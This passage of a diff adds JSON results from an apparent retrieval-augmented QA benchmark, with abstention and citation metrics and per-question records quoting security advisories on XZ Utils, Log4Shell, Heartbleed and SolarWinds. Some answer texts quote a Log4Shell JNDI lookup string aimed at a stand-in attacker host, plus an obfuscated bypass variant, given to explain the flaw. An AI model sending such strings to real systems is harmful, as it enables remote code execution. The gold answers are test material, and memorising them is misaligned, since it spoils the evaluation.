+            "S5::c01",
+            "S1::c00",
+            "S5::c00"
+          ]
+        },
+        {
+          "qid": "h10",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S7::c02"
+          ],
+          "gold_answer": "SwiftSafeAllocator::allocate_aligned(size_t bytes, size_t alignment)",
+          "predicted_chunk_ids": [
+            "S7::c00"
+          ],
+          "answer_text": "# SwiftSafe System Architecture & Memory Safety Guidelines\n\n## Overview\nSwiftSafe is a safe system programming framework designed to eliminate memory corruption vulnerabilities (use-after-free, double free, buffer overflow) in native binaries through compile-time ownership tracking and automated static inspection.\n\n## Memory Safety Guarantees\n1. **Zero Raw Pointers in Public API:** All reference passing must use safe wrappers (`SafeRef<T>` or `UniquePtr<T>`).",
+          "context_injected": [
+            "S7::c00",
+            "S7::c02",
+            "S7::c01",
+            "S2::c01",
+            "S5::c01",
+            "S5::c02"
+          ]
+        },
+        {
+          "qid": "h11",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S2::c03"
+          ],
+          "gold_answer": "Enforce least privilege by default, implement access control mechanisms once and re-use them while minimizing CORS, and disable web server directory listing",
+          "predicted_chunk_ids": [
+            "S2::c02"
+          ],
+          "answer_text": "2. Use positive server-side input validation with strict allowlists.\n3. Escape special characters using context-aware escaping APIs when parameterized interfaces are unavailable.\n\n## A01:2021 \u2013 Broken Access Control\nAccess control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of all data or performing a business function outside the user's limits.\n\n### Prevention Controls",
+          "context_injected": [
+            "S2::c02",
+            "S2::c00",
+            "S2::c03",
+            "S4::c00",
+            "S4::c01",
+            "S4::c02"
+          ]
+        },
+        {
+          "qid": "h12",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S5::c03"
+          ],
+          "gold_answer": "CVSS v2 base score 5.0 (CVSS v3: 7.5 High)",
+          "predicted_chunk_ids": [
+            "S5::c03"
+          ],
+          "answer_text": "## Fix and Remediation\n- Upgrade OpenSSL to version 1.0.1g or compile OpenSSL with flag `-DOPENSSL_NO_HEARTBEATS`.\n- Revoke and re-issue all SSL/TLS private keys and certificates.\n- Force password resets across all affected user authentication databases.\n\nCVSS v2 Base Score: 5.0 (CVSS v3: 7.5 High).",
+          "context_injected": [
+            "S5::c03",
+            "S1::c03",
+            "S5::c00",
+            "S3::c02",
+            "S1::c00",
+            "S6::c01"
+          ]
+        },
+        {
+          "qid": "h13",
+          "bucket": "unanswerable",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S6::c02"
+          ],
+          "answer_text": "## Remediation Steps\n1. Upgrade SolarWinds Orion platform to version 2020.2.1 HF 2 or 2020.2.5 immediately.\n2. Isolate affected Orion servers and rotate all active directory administrative credentials and SAML signing certificates.",
+          "context_injected": [
+            "S6::c02",
+            "S2::c03",
+            "S3::c00",
+            "S1::c00",
+            "S4::c02",
+            "S3::c02"
+          ]
+        },
+        {
+          "qid": "h14",
+          "bucket": "unanswerable",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S6::c00"
+          ],
+          "answer_text": "# Cybersecurity Advisory: SolarWinds SUNBURST Supply Chain Attack\n\n## Executive Summary\nIn late 2020, threat group UNC2452 executed a sophisticated supply chain attack against SolarWinds Orion platform releases 2019.4 HF 5 through 2020.2.1 HF 1. The attackers trojanized the source code build environment to inject a backdoor component dubbed \"SUNBURST\" (`SolarWinds.Orion.Core.BusinessLayer.dll`).\n\n## Attack Characteristics & Persistence",
+          "context_injected": [
+            "S6::c00",
+            "S5::c01",
+            "S1::c01",
+            "S1::c02",
+            "S1::c00",
+            "S1::c03"
+          ]
+        },
+        {
+          "qid": "h15",
+          "bucket": "unanswerable",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S2::c00"
+          ],
+          "answer_text": "# OWASP Top 10 Security Focus: Injection and Broken Access Control\n\n## A03:2021 \u2013 Injection\nInjection flaws, such as SQL, NoSQL, OS Command, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.\n\n### Common Vectors",
+          "context_injected": [
+            "S2::c00",
+            "S6::c02",
+            "S4::c01",
+            "S4::c02",
+            "S2::c02",
+            "S4::c00"
+          ]
+        },
+        {
+          "qid": "h16",
+          "bucket": "unanswerable",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S4::c02"
+          ],
+          "answer_text": "## AC-17 Remote Access\nEnforces explicit authorization for remote access connections. Employs cryptographic mechanisms (TLS 1.3 or IPsec VPNs) to protect the confidentiality and integrity of remote access sessions, mandatory multi-factor authentication (MFA) for all remote management access.",
+          "context_injected": [
+            "S4::c02",
+            "S8::c00",
+            "S5::c01",
+            "S6::c01",
+            "S4::c01",
+            "S1::c00"
+          ]
+        },
+        {
+          "qid": "h17",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S1::c00"
+          ],
+          "answer_text": "# Technical Analysis of CVE-2024-3094: XZ Utils Backdoor\n\n## Overview\nCVE-2024-3094 is a critical supply-chain vulnerability discovered in XZ Utils versions 5.6.0 and 5.6.1. The backdoor was introduced by an upstream maintainer account named Jia Tan over an extended period. The compromise alters functions within `liblzma`, specifically targeting OpenSSH server authentication mechanisms when linked against `systemd` socket activation libraries.\n\n## Technical Mechanism",
+          "context_injected": [
+            "S1::c00",
+            "S1::c01",
+            "S4::c00",
+            "S3::c01",
+            "S1::c02",
+            "S6::c00"
+          ]
+        },
+        {
+          "qid": "h18",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S6::c00"
+          ],
+          "answer_text": "# Cybersecurity Advisory: SolarWinds SUNBURST Supply Chain Attack\n\n## Executive Summary\nIn late 2020, threat group UNC2452 executed a sophisticated supply chain attack against SolarWinds Orion platform releases 2019.4 HF 5 through 2020.2.1 HF 1. The attackers trojanized the source code build environment to inject a backdoor component dubbed \"SUNBURST\" (`SolarWinds.Orion.Core.BusinessLayer.dll`).\n\n## Attack Characteristics & Persistence",
+          "context_injected": [
+            "S6::c00",
+            "S6::c01",
+            "S1::c02",
+            "S1::c00",
+            "S1::c03",
+            "S4::c01"
+          ]
+        },
+        {
+          "qid": "h19",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S5::c00"
+          ],
+          "answer_text": "# Heartbleed Bug Advisory: OpenSSL Memory Disclosure (CVE-2014-0160)\n\n## Overview\nCVE-2014-0160, known as \"Heartbleed\", is a severe memory leakage flaw in the OpenSSL cryptographic software library (versions 1.0.1 through 1.0.1f). The bug allows remote attackers to read up to 64 kilobytes of host memory per heartbeat payload without authorization.\n\n## Root Cause Analysis\nThe flaw stems from missing bounds checking on a TLS heartbeat extension request payload.",
+          "context_injected": [
+            "S5::c00",
+            "S1::c00",
+            "S1::c01",
+            "S1::c02",
+            "S2::c00",
+            "S5::c01"
+          ]
+        },
+        {
+          "qid": "h20",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S3::c01"
+          ],
+          "answer_text": "When Log4j logs a string containing the syntax `${jndi:ldap://attacker.com/a}`, the JNDI lookup plugin resolves the URL. It contacts the specified LDAP server, retrieves a remote Java class file reference, and executes the payload dynamically within the Java Virtual Machine (JVM) context under the service account privileges.\n\n## Attack Vectors\n- User-Agent HTTP headers containing JNDI lookup strings.\n- Form field values (username, search parameters) logged by application logging handlers.\n- Nested lookups allowing bypasses like `${jndi:${lower:l}${lower:d}ap://...}`.",
+          "context_injected": [
+            "S3::c01",
+            "S3::c00",
+            "S3::c02",
+            "S2::c00",
+            "S1::c03",
+            "S1::c02"
+          ]
+        },
+        {
+          "qid": "h21",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S4::c00"
+          ],
+          "answer_text": "# NIST Special Publication 800-53 Revision 5: Access Control (AC) Security Controls\n\n## AC-2 Account Management\nThe organization manages information system accounts, including establishing, activating, modifying, reviewing, disabling, and removing accounts in accordance with organizational procedures.\n\n### Control Enhancements\n- **AC-2(1) Automated System Account Management:** Employs automated mechanisms to support the management of information system accounts.\n- **AC-2(3) Disable Inactive Accounts:** Automatically disables inactive accounts after 90 days of operational inactivity.\n\n## AC-3 Access Enforcement",
+          "context_injected": [
+            "S4::c00",
+            "S6::c01",
+            "S8::c01",
+            "S4::c01",
+            "S2::c02",
+            "S7::c02"
+          ]
+        },
+        {
+          "qid": "h22",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S8::c00"
+          ],
+          "answer_text": "# RFC 8446 Security Overview: Transport Layer Security (TLS) Protocol Version 1.3\n\n## Core Protocol Enhancements\nTLS 1.3 (RFC 8446) redesigns the handshake protocol to improve security and latency over TLS 1.2:\n1. **1-RTT Handshake:** Reduces connection handshake latency from 2-RTT to 1-RTT for full handshakes and 0-RTT for resumption (session tickets).\n2. **Mandatory Perfect Forward Secrecy (PFS):** Removes RSA static key exchange; all handshakes require Ephemeral Diffie-Hellman (ECDHE or DHE).",
+          "context_injected": [
+            "S8::c00",
+            "S5::c01",
+            "S8::c01",
+            "S5::c00",
+            "S4::c02",
+            "S4::c01"
+          ]
+        },
+        {
+          "qid": "h23",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S1::c00"
+          ],
+          "answer_text": "# Technical Analysis of CVE-2024-3094: XZ Utils Backdoor\n\n## Overview\nCVE-2024-3094 is a critical supply-chain vulnerability discovered in XZ Utils versions 5.6.0 and 5.6.1. The backdoor was introduced by an upstream maintainer account named Jia Tan over an extended period. The compromise alters functions within `liblzma`, specifically targeting OpenSSH server authentication mechanisms when linked against `systemd` socket activation libraries.\n\n## Technical Mechanism",
+          "context_injected": [
+            "S1::c00",
+            "S1::c02",
+            "S1::c03",
+            "S4::c02",
+            "S6::c01",
+            "S5::c02"
+          ]
+        },
+        {
+          "qid": "h24",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S7::c01"
+          ],
+          "answer_text": "1. **Zero Raw Pointers in Public API:** All reference passing must use safe wrappers (`SafeRef<T>` or `UniquePtr<T>`).\n2. **Bounds Checking:** Direct array indexing compiles to runtime bounds-checked assertions unless proven safe by static loop bounds invariants.\n3. **Use-After-Free Prevention:** Lifetime annotations enforce that borrowed references cannot outlive their parent scope owner.\n\n## Verification Engine\nSwiftSafe integrates static analysis checks within the CI pipeline:\n- Static analysis pass checks for concurrency race conditions on shared global memory.",
+          "context_injected": [
+            "S7::c01",
+            "S7::c00",
+            "S2::c01",
+            "S2::c02",
+            "S7::c02",
+            "S1::c02"
+          ]
+        }
+      ]
+    },
+    "plus_reranker": {
+      "abstention": {
+        "ta": 11,
+        "fa": 4,
+        "fr": 1,
+        "tr": 8,
+        "accuracy": 0.7917,
+        "false_answer_rate": 0.3333,
+        "over_refusal_rate": 0.0833
+      },
+      "gold_citation": {
+        "precision": 0.8182,
+        "recall": 0.75,
+        "f1": 0.7826,
+        "questions_scored": 12,
+        "citations_predicted": 11,
+        "citations_gold": 12
+      },
+      "gold_answer_recall": {
+        "mean_token_recall": 0.765,
+        "questions_scored": 12
+      },
+      "retrieval": {
+        "recall_at_final_k": 1.0,
+        "mrr": 0.9028,
+        "questions_scored": 12
+      },
+      "self_consistency": {
+        "entailed_rate": 1.0,
+        "citation_necessity": 1.0,
+        "claims": 15,
+        "backends": [
+          "disabled"
+        ]
+      },
+      "auroc_signal": 0.9028,
+      "generators": {
+        "extractive-fallback": 15
+      },
+      "records": [
+        {
+          "qid": "h01",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S1::c00"
+          ],
+          "gold_answer": "XZ Utils versions 5.6.0 and 5.6.1",
+          "predicted_chunk_ids": [
+            "S1::c00"
+          ],
+          "answer_text": "# Technical Analysis of CVE-2024-3094: XZ Utils Backdoor\n\n## Overview\nCVE-2024-3094 is a critical supply-chain vulnerability discovered in XZ Utils versions 5.6.0 and 5.6.1. The backdoor was introduced by an upstream maintainer account named Jia Tan over an extended period. The compromise alters functions within `liblzma`, specifically targeting OpenSSH server authentication mechanisms when linked against `systemd` socket activation libraries.\n\n## Technical Mechanism",
+          "context_injected": [
+            "S1::c00",
+            "S1::c03",
+            "S6::c01",
+            "S1::c01",
+            "S1::c02",
+            "S3::c00"
+          ]
+        },
+        {
+          "qid": "h02",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S1::c01"
+          ],
+          "gold_answer": "m4/build-to-host.m4 runs a bash extraction script during the build process",
+          "predicted_chunk_ids": [
+            "S1::c01"
+          ],
+          "answer_text": "## Technical Mechanism\nThe malicious payload is obfuscated within binary test files (`bad-3-corrupt_lzma2.xz` and `good-large_compressed.lzma`) included in the source tarballs. During the build process via `m4/build-to-host.m4`, a complex bash extraction script decodes the payload if specific target conditions are met (e.g., x86-64 Linux environment using GCC and GNU ld).\n\nThe extracted object file intercepts the RSA key signature verification function `RSA_public_decrypt` in OpenSSH (`sshd`).",
+          "context_injected": [
+            "S1::c01",
+            "S1::c03",
+            "S1::c00",
+            "S6::c01",
+            "S3::c01",
+            "S5::c02"
+          ]
+        },
+        {
+          "qid": "h03",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S3::c00"
+          ],
+          "gold_answer": "Apache Log4j2 versions 2.0-beta9 through 2.14.1",
+          "predicted_chunk_ids": [
+            "S3::c00"
+          ],
+          "answer_text": "# Technical Deep Dive: Log4Shell Vulnerability (CVE-2021-44228)\n\n## Overview\nCVE-2021-44228, dubbed \"Log4Shell\", is a remote code execution (RCE) vulnerability in Apache Log4j2 versions 2.0-beta9 through 2.14.1. The vulnerability resides in the message lookup substitution feature where JNDI (Java Naming and Directory Interface) strings are parsed without sanitization.\n\n## Exploitation Mechanism\nWhen Log4j logs a string containing the syntax `${jndi:ldap://attacker.com/a}`, the JNDI lookup plugin resolves the URL.",
+          "context_injected": [
+            "S3::c00",
+            "S3::c02",
+            "S3::c01",
+            "S1::c03",
+            "S8::c01",
+            "S5::c03"
+          ]
+        },
+        {
+          "qid": "h04",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S3::c02"
+          ],
+          "gold_answer": "log4j2.formatMsgNoLookups=true, or the environment variable LOG4J_FORMAT_MSG_NO_LOOKUPS=true",
+          "predicted_chunk_ids": [
+            "S3::c02"
+          ],
+          "answer_text": "- Nested lookups allowing bypasses like `${jndi:${lower:l}${lower:d}ap://...}`.\n\n## Remediation and Mitigation\n1. Upgrade Apache Log4j2 to version 2.17.1 or higher for Java 8 users.\n2. For Log4j 2.10 to 2.14.1, set system property `log4j2.formatMsgNoLookups=true` or environment variable `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`.\n3. Remove the `JndiLookup` class from the classpath using `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`.\n\nCVSS v3.1 Base Score: 10.0 (Critical).",
+          "context_injected": [
+            "S3::c02",
+            "S3::c00",
+            "S3::c01",
+            "S6::c01",
+            "S8::c01",
+            "S4::c01"
+          ]
+        },
+        {
+          "qid": "h05",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S5::c03"
+          ],
+          "gold_answer": "OpenSSL 1.0.1g, or compiling with the flag -DOPENSSL_NO_HEARTBEATS",
+          "predicted_chunk_ids": [
+            "S5::c00"
+          ],
+          "answer_text": "# Heartbleed Bug Advisory: OpenSSL Memory Disclosure (CVE-2014-0160)\n\n## Overview\nCVE-2014-0160, known as \"Heartbleed\", is a severe memory leakage flaw in the OpenSSL cryptographic software library (versions 1.0.1 through 1.0.1f). The bug allows remote attackers to read up to 64 kilobytes of host memory per heartbeat payload without authorization.\n\n## Root Cause Analysis\nThe flaw stems from missing bounds checking on a TLS heartbeat extension request payload.",
+          "context_injected": [
+            "S5::c00",
+            "S5::c03",
+            "S5::c01",
+            "S5::c02",
+            "S8::c01",
+            "S1::c03"
+          ]
+        },
+        {
+          "qid": "h06",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S6::c00"
+          ],
+          "gold_answer": "Orion platform releases 2019.4 HF 5 through 2020.2.1 HF 1",
+          "predicted_chunk_ids": [
+            "S6::c00"
+          ],
+          "answer_text": "# Cybersecurity Advisory: SolarWinds SUNBURST Supply Chain Attack\n\n## Executive Summary\nIn late 2020, threat group UNC2452 executed a sophisticated supply chain attack against SolarWinds Orion platform releases 2019.4 HF 5 through 2020.2.1 HF 1. The attackers trojanized the source code build environment to inject a backdoor component dubbed \"SUNBURST\" (`SolarWinds.Orion.Core.BusinessLayer.dll`).\n\n## Attack Characteristics & Persistence",
+          "context_injected": [
+            "S6::c00",
+            "S6::c02",
+            "S6::c01",
+            "S1::c03",
+            "S1::c02",
+            "S1::c00"
+          ]
+        },
+        {
+          "qid": "h07",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": true,
+          "gold_chunk_ids": [
+            "S6::c01"
+          ],
+          "gold_answer": "avsvmcloud.com",
+          "predicted_chunk_ids": [],
+          "answer_text": "",
+          "context_injected": [
+            "S6::c01",
+            "S6::c00",
+            "S3::c01",
+            "S1::c03",
+            "S1::c02",
+            "S2::c00"
+          ]
+        },
+        {
+          "qid": "h08",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S4::c02"
+          ],
+          "gold_answer": "TLS 1.3 or IPsec VPNs, with mandatory multi-factor authentication for remote management access",
+          "predicted_chunk_ids": [
+            "S4::c02"
+          ],
+          "answer_text": "## AC-17 Remote Access\nEnforces explicit authorization for remote access connections. Employs cryptographic mechanisms (TLS 1.3 or IPsec VPNs) to protect the confidentiality and integrity of remote access sessions, mandatory multi-factor authentication (MFA) for all remote management access.",
+          "context_injected": [
+            "S4::c02",
+            "S4::c01",
+            "S8::c01",
+            "S4::c00",
+            "S8::c00",
+            "S1::c01"
+          ]
+        },
+        {
+          "qid": "h09",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S8::c01"
+          ],
+          "gold_answer": "RC4, MD5, SHA-224, 3DES, static RSA key exchange, and CBC mode ciphers",
+          "predicted_chunk_ids": [
+            "S8::c01"
+          ],
+          "answer_text": "2. **Mandatory Perfect Forward Secrecy (PFS):** Removes RSA static key exchange; all handshakes require Ephemeral Diffie-Hellman (ECDHE or DHE).\n3. **Deprecation of Insecure Algorithms:** Removes support for RC4, MD5, SHA-224, 3DES, static RSA key exchange, and CBC mode ciphers.\n\n## Cryptographic Cipher Suites\nTLS 1.3 defines simplified cipher suites specifying authenticated encryption with associated data (AEAD):\n- `TLS_AES_128_GCM_SHA256`\n- `TLS_AES_256_GCM_SHA384`\n- `TLS_CHACHA20_POLY1305_SHA256`",
+          "context_injected": [
+            "S8::c01",
+            "S8::c00",
+            "S4::c02",
+            "S5::c01",
+            "S7::c01",
+            "S5::c00"
+          ]
+        },
+        {
+          "qid": "h10",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S7::c02"
+          ],
+          "gold_answer": "SwiftSafeAllocator::allocate_aligned(size_t bytes, size_t alignment)",
+          "predicted_chunk_ids": [
+            "S7::c02"
+          ],
+          "answer_text": "- Static analysis pass checks for concurrency race conditions on shared global memory.\n- Safe dynamic memory allocations require `SwiftSafeAllocator::allocate_aligned(size_t bytes, size_t alignment)`.",
+          "context_injected": [
+            "S7::c02",
+            "S7::c00",
+            "S7::c01",
+            "S5::c02",
+            "S8::c01",
+            "S5::c01"
+          ]
+        },
+        {
+          "qid": "h11",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S2::c03"
+          ],
+          "gold_answer": "Enforce least privilege by default, implement access control mechanisms once and re-use them while minimizing CORS, and disable web server directory listing",
+          "predicted_chunk_ids": [
+            "S2::c00"
+          ],
+          "answer_text": "# OWASP Top 10 Security Focus: Injection and Broken Access Control\n\n## A03:2021 \u2013 Injection\nInjection flaws, such as SQL, NoSQL, OS Command, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.\n\n### Common Vectors",
+          "context_injected": [
+            "S2::c00",
+            "S2::c02",
+            "S2::c03",
+            "S4::c01",
+            "S4::c00",
+            "S2::c01"
+          ]
+        },
+        {
+          "qid": "h12",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S5::c03"
+          ],
+          "gold_answer": "CVSS v2 base score 5.0 (CVSS v3: 7.5 High)",
+          "predicted_chunk_ids": [
+            "S5::c03"
+          ],
+          "answer_text": "## Fix and Remediation\n- Upgrade OpenSSL to version 1.0.1g or compile OpenSSL with flag `-DOPENSSL_NO_HEARTBEATS`.\n- Revoke and re-issue all SSL/TLS private keys and certificates.\n- Force password resets across all affected user authentication databases.\n\nCVSS v2 Base Score: 5.0 (CVSS v3: 7.5 High).",
+          "context_injected": [
+            "S5::c03",
+            "S5::c00",
+            "S1::c03",
+            "S3::c02",
+            "S5::c01",
+            "S1::c00"
+          ]
+        },
+        {
+          "qid": "h13",
+          "bucket": "unanswerable",
+          "is_answerable": false,
+          "abstained": true,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [],
+          "answer_text": "",
+          "context_injected": [
+            "S3::c00",
+            "S3::c02",
+            "S1::c03",
+            "S2::c01",
+            "S8::c01",
+            "S2::c02"
+          ]
+        },
+        {
+          "qid": "h14",
+          "bucket": "unanswerable",
+          "is_answerable": false,
+          "abstained": true,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [],
+          "answer_text": "",
+          "context_injected": [
+            "S1::c03",
+            "S1::c00",
+            "S6::c00",
+            "S8::c01",
+            "S1::c02",
+            "S3::c00"
+          ]
+        },
+        {
+          "qid": "h15",
+          "bucket": "unanswerable",
+          "is_answerable": false,
+          "abstained": true,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [],
+          "answer_text": "",
+          "context_injected": [
+            "S6::c02",
+            "S8::c01",
+            "S2::c01",
+            "S2::c00",
+            "S4::c00",
+            "S8::c00"
+          ]
+        },
+        {
+          "qid": "h16",
+          "bucket": "unanswerable",
+          "is_answerable": false,
+          "abstained": true,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [],
+          "answer_text": "",
+          "context_injected": [
+            "S1::c03",
+            "S8::c00",
+            "S8::c01",
+            "S1::c02",
+            "S5::c00",
+            "S4::c01"
+          ]
+        },
+        {
+          "qid": "h17",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S1::c00"
+          ],
+          "answer_text": "# Technical Analysis of CVE-2024-3094: XZ Utils Backdoor\n\n## Overview\nCVE-2024-3094 is a critical supply-chain vulnerability discovered in XZ Utils versions 5.6.0 and 5.6.1. The backdoor was introduced by an upstream maintainer account named Jia Tan over an extended period. The compromise alters functions within `liblzma`, specifically targeting OpenSSH server authentication mechanisms when linked against `systemd` socket activation libraries.\n\n## Technical Mechanism",
+          "context_injected": [
+            "S1::c00",
+            "S1::c03",
+            "S5::c00",
+            "S3::c00",
+            "S8::c01",
+            "S6::c00"
+          ]
+        },
+        {
+          "qid": "h18",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": true,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [],
+          "answer_text": "",
+          "context_injected": [
+            "S6::c00",
+            "S6::c01",
+            "S1::c02",
+            "S1::c00",
+            "S1::c03",
+            "S3::c00"
+          ]
+        },
+        {
+          "qid": "h19",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S5::c00"
+          ],
+          "answer_text": "# Heartbleed Bug Advisory: OpenSSL Memory Disclosure (CVE-2014-0160)\n\n## Overview\nCVE-2014-0160, known as \"Heartbleed\", is a severe memory leakage flaw in the OpenSSL cryptographic software library (versions 1.0.1 through 1.0.1f). The bug allows remote attackers to read up to 64 kilobytes of host memory per heartbeat payload without authorization.\n\n## Root Cause Analysis\nThe flaw stems from missing bounds checking on a TLS heartbeat extension request payload.",
+          "context_injected": [
+            "S5::c00",
+            "S5::c01",
+            "S5::c03",
+            "S1::c03",
+            "S1::c02",
+            "S5::c02"
+          ]
+        },
+        {
+          "qid": "h20",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": true,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [],
+          "answer_text": "",
+          "context_injected": [
+            "S3::c01",
+            "S3::c00",
+            "S3::c02",
+            "S1::c02",
+            "S1::c03",
+            "S8::c00"
+          ]
+        },
+        {
+          "qid": "h21",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S4::c00"
+          ],
+          "answer_text": "# NIST Special Publication 800-53 Revision 5: Access Control (AC) Security Controls\n\n## AC-2 Account Management\nThe organization manages information system accounts, including establishing, activating, modifying, reviewing, disabling, and removing accounts in accordance with organizational procedures.\n\n### Control Enhancements\n- **AC-2(1) Automated System Account Management:** Employs automated mechanisms to support the management of information system accounts.\n- **AC-2(3) Disable Inactive Accounts:** Automatically disables inactive accounts after 90 days of operational inactivity.\n\n## AC-3 Access Enforcement",
+          "context_injected": [
+            "S4::c00",
+            "S4::c01",
+            "S6::c01",
+            "S2::c02",
+            "S1::c03",
+            "S7::c01"
+          ]
+        },
+        {
+          "qid": "h22",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": true,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [],
+          "answer_text": "",
+          "context_injected": [
+            "S8::c00",
+            "S8::c01",
+            "S5::c01",
+            "S4::c02",
+            "S5::c00",
+            "S4::c01"
+          ]
+        },
+        {
+          "qid": "h23",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": true,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [],
+          "answer_text": "",
+          "context_injected": [
+            "S1::c00",
+            "S1::c03",
+            "S1::c02",
+            "S6::c01",
+            "S1::c01",
+            "S6::c00"
+          ]
+        },
+        {
+          "qid": "h24",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S7::c02"
+          ],
+          "answer_text": "- Static analysis pass checks for concurrency race conditions on shared global memory.\n- Safe dynamic memory allocations require `SwiftSafeAllocator::allocate_aligned(size_t bytes, size_t alignment)`.",
+          "context_injected": [
+            "S7::c02",
+            "S7::c00",
+            "S7::c01",
+            "S8::c01",
+            "S5::c02",
+            "S5::c01"
+          ]
+        }
+      ]
+    },
+    "veritas_full": {
+      "abstention": {
+        "ta": 11,
+        "fa": 4,
+        "fr": 1,
+        "tr": 8,
+        "accuracy": 0.7917,
+        "false_answer_rate": 0.3333,
+        "over_refusal_rate": 0.0833
+      },
+      "gold_citation": {
+        "precision": 0.8182,
+        "recall": 0.75,
+        "f1": 0.7826,
+        "questions_scored": 12,
+        "citations_predicted": 11,
+        "citations_gold": 12
+      },
+      "gold_answer_recall": {
+        "mean_token_recall": 0.765,
+        "questions_scored": 12
+      },
+      "retrieval": {
+        "recall_at_final_k": 1.0,
+        "mrr": 0.9028,
+        "questions_scored": 12
+      },
+      "self_consistency": {
+        "entailed_rate": 1.0,
+        "citation_necessity": 1.0,
+        "claims": 15,
+        "backends": [
+          "lytang/MiniCheck-DeBERTa-v3-Large"
+        ]
+      },
+      "auroc_signal": 0.9028,
+      "generators": {
+        "extractive-fallback": 15
+      },
+      "records": [
+        {
+          "qid": "h01",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S1::c00"
+          ],
+          "gold_answer": "XZ Utils versions 5.6.0 and 5.6.1",
+          "predicted_chunk_ids": [
+            "S1::c00"
+          ],
